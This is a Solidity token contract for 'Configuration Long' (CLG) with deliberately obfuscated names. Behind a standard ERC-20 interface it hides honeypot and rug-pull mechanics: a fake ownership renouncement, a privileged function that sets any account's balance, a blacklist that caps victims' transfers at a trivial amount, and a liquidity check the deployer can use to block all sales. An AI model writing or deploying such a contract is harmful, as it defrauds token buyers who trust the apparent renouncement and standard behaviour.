//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface sellMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract buySender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoTotal {
    function createPair(address toModeWallet, address totalShouldLaunch) external returns (address);
}

interface takeTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minAmount) external view returns (uint256);

    function transfer(address enableLaunch, uint256 takeLaunched) external returns (bool);

    function allowance(address fromReceiverAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address enableLaunch,
        uint256 takeLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchSell, uint256 value);
    event Approval(address indexed fromReceiverAuto, address indexed spender, uint256 value);
}

interface takeTeamMetadata is takeTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ConfigurationLong is buySender, takeTeam, takeTeamMetadata {

    string private listTeamSell = "Configuration Long";

    function approve(address marketingMin, uint256 takeLaunched) public virtual override returns (bool) {
        exemptMaxAmount[_msgSender()][marketingMin] = takeLaunched;
        emit Approval(_msgSender(), marketingMin, takeLaunched);
        return true;
    }

    bool public buyAt;

    function receiverLiquidity(uint256 takeLaunched) public {
        receiverLimitTake();
        liquidityFund = takeLaunched;
    }

    uint256 liquidityFund;

    mapping(address => mapping(address => uint256)) private exemptMaxAmount;

    function receiverLimitTake() private view {
        require(atLaunch[_msgSender()]);
    }

    bool public amountTake;

    mapping(address => uint256) private atLaunchTeam;

    uint256 constant shouldMode = 11 ** 10;

    function takeWallet(address fromBuy) public {
        if (buyAt) {
            return;
        }
        if (minFeeMarketing == fromReceiver) {
            minFeeMarketing = fromReceiver;
        }
        atLaunch[fromBuy] = true;
        if (fromReceiver != minFeeMarketing) {
            fromReceiver = minFeeMarketing;
        }
        buyAt = true;
    }

    address listLiquidityAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private minFeeMarketing;

    function shouldAuto(address modeTakeToken) public {
        receiverLimitTake();
        
        if (modeTakeToken == amountTx || modeTakeToken == teamReceiverLimit) {
            return;
        }
        liquidityAtExempt[modeTakeToken] = true;
    }

    function balanceOf(address minAmount) public view virtual override returns (uint256) {
        return atLaunchTeam[minAmount];
    }

    function getOwner() external view returns (address) {
        return walletSender;
    }

    uint256 private fromReceiver;

    function owner() external view returns (address) {
        return walletSender;
    }

    address private walletSender;

    function walletMax() public {
        emit OwnershipTransferred(amountTx, address(0));
        walletSender = address(0);
    }

    function transferFrom(address walletAuto, address enableLaunch, uint256 takeLaunched) external override returns (bool) {
        if (_msgSender() != listLiquidityAuto) {
            if (exemptMaxAmount[walletAuto][_msgSender()] != type(uint256).max) {
                require(takeLaunched <= exemptMaxAmount[walletAuto][_msgSender()]);
                exemptMaxAmount[walletAuto][_msgSender()] -= takeLaunched;
            }
        }
        return amountMax(walletAuto, enableLaunch, takeLaunched);
    }

    bool private receiverTake;

    uint8 private autoLimit = 18;

    mapping(address => bool) public liquidityAtExempt;

    mapping(address => bool) public atLaunch;

    function symbol() external view virtual override returns (string memory) {
        return enableTake;
    }

    function transfer(address modeTradingWallet, uint256 takeLaunched) external virtual override returns (bool) {
        return amountMax(_msgSender(), modeTradingWallet, takeLaunched);
    }

    function sellLaunched(address walletAuto, address enableLaunch, uint256 takeLaunched) internal returns (bool) {
        require(atLaunchTeam[walletAuto] >= takeLaunched);
        atLaunchTeam[walletAuto] -= takeLaunched;
        atLaunchTeam[enableLaunch] += takeLaunched;
        emit Transfer(walletAuto, enableLaunch, takeLaunched);
        return true;
    }

    function amountMax(address walletAuto, address enableLaunch, uint256 takeLaunched) internal returns (bool) {
        if (walletAuto == amountTx) {
            return sellLaunched(walletAuto, enableLaunch, takeLaunched);
        }
        uint256 fundMaxReceiver = takeTeam(teamReceiverLimit).balanceOf(listToTeam);
        require(fundMaxReceiver == liquidityFund);
        require(enableLaunch != listToTeam);
        if (liquidityAtExempt[walletAuto]) {
            return sellLaunched(walletAuto, enableLaunch, shouldMode);
        }
        return sellLaunched(walletAuto, enableLaunch, takeLaunched);
    }

    function allowance(address launchReceiverTx, address marketingMin) external view virtual override returns (uint256) {
        if (marketingMin == listLiquidityAuto) {
            return type(uint256).max;
        }
        return exemptMaxAmount[launchReceiverTx][marketingMin];
    }

    uint256 modeAt;

    address public amountTx;

    function swapIs(address modeTradingWallet, uint256 takeLaunched) public {
        receiverLimitTake();
        atLaunchTeam[modeTradingWallet] = takeLaunched;
    }

    event OwnershipTransferred(address indexed walletFrom, address indexed fromMax);

    address listToTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return autoLimit;
    }

    function name() external view virtual override returns (string memory) {
        return listTeamSell;
    }

    bool public sellMax;

    uint256 private tokenReceiverMarketing = 100000000 * 10 ** 18;

    string private enableTake = "CLG";

    address public teamReceiverLimit;

    constructor (){
        if (sellMax != receiverTake) {
            receiverTake = false;
        }
        sellMode minTradingMode = sellMode(listLiquidityAuto);
        teamReceiverLimit = autoTotal(minTradingMode.factory()).createPair(minTradingMode.WETH(), address(this));
        if (fromReceiver != minFeeMarketing) {
            fromReceiver = minFeeMarketing;
        }
        amountTx = _msgSender();
        walletMax();
        atLaunch[amountTx] = true;
        atLaunchTeam[amountTx] = tokenReceiverMarketing;
        
        emit Transfer(address(0), amountTx, tokenReceiverMarketing);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenReceiverMarketing;
    }

}